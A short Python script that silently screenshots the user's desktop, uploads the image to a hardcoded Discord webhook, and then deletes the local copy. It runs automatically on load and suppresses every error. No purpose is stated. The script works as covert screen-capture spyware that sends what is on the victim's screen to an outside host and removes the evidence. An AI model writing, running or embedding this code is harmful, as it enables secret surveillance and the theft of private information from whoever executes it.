import pyautogui
import requests
import os
import platform
from datetime import datetime

def screenshot_flow():
    try:
        # Take screenshot
        screenshot = pyautogui.screenshot()
        
        # Create filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        
        # Get desktop path
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        file_path = os.path.join(desktop_path, filename)
        
        # Save to desktop
        screenshot.save(file_path)
        
        # Send to Discord
        WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"
        
        with open(file_path, 'rb') as f:
            files = {'file': (filename, f, 'image/png')}
            response = requests.post(WEBHOOK_URL, files=files, data={'content': '📸'})
        
        # Delete after send (even if failed)
        if os.path.exists(file_path):
            os.remove(file_path)
            
    except Exception as e:
        # Clean up if anything fails
        try:
            if 'file_path' in locals() and os.path.exists(file_path):
                os.remove(file_path)
        except:
            pass

# Run automatically when loaded
screenshot_flow()
